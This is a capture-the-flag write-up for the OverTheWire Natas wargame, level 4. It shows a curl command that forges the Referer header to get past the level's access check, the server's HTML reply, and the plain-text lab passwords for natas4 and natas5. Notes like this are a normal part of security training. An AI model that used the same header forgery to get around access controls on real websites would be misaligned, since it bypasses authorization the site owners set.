# Natas Level 3 → Level 4

## 🧠 Goal

Find password to the next level

---

## 🔐 Credentials

- **Username:** `natas4`  
- **Host:** `http://natas4.natas.labs.overthewire.org`   
- **Port:** `80` (HTTP)  
- **Password:** `QryZXc2e0zahULdHrtHxzyYkj59kUxLQ` 

---

## 🖥️ Commands Used

```bash
# curl -u natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ http://natas4.natas.labs.overthewire.org
┌──(amro㉿amro)-[~]
└─$ curl -u natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ http://natas4.natas.labs.overthewire.org \
> -H "Referer: http://natas5.natas.labs.overthewire.org/"
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas4", "pass": "QryZXc2e0zahULdHrtHxzyYkj59kUxLQ" };</script></head>
<body>
<h1>natas4</h1>
<div id="content">

Access granted. The password for natas5 is 0n35PkggAPm2zbEpOU802c0x0Msn1ToK
<br/>
<div id="viewsource"><a href="index.php">Refresh page</a></div>
</div>
</body>
</html>
```
![level_04](./images/level_04.png)
___

## 💡 Tips
```bash

```
___

## 📤 Output
```bash
0n35PkggAPm2zbEpOU802c0x0Msn1ToK
```
